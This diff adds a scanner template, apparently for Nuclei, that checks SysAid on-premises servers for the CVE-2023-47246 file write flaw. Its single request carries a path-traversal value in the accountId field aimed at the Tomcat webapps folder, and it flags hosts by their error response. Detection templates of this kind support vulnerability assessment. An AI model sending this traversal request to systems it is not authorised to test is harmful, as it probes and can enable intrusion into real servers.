@@ -1,0 +1,26 @@
+id: sysaid-server-anyfile-upload
+info:
+  name: SysAid File Write Vulnerability (CVE-2023-47246)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2023-47246,high,critical
+  description: |
+    SysAid on-premises instances are vulnerable to an arbitrary file write vulnerability, allowing attackers to write files to unintended locations.
+http:
+  - raw:
+      - |
+        POST /userentry?accountId=/../../../tomcat/webapps/fdafs/&symbolName=test&base64UserName=YWRtaW4= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        jjj
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "java.io.EOFException: Unexpected end of ZLIB input stream"
+          - "The full stack trace of the root cause is available in the server logs"
+        part: body
